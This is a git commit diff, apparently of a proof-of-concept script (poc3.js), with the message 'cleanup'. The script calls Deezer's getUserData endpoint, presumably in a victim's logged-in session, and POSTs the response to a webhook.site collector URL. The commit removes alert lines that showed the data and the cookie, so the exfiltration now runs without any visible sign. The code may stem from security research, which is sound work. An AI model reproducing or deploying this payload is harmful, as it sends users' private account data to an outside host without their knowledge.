9bc291ca468351700f3590ac21d83a0a7e464a37
Badr <macbookprom2@Badreddine-Belkadi.local>
2026-01-27 22:46:03 +0100

    cleanup

--- poc3.js
+++ poc3.js
@@ -2,5 +2,4 @@ fetch('https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=
   .then(r => r.text())
   .then(d => fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb', {method:'POST', body:d}))
 
-alert(d);
-alert(document.cookie);
+  
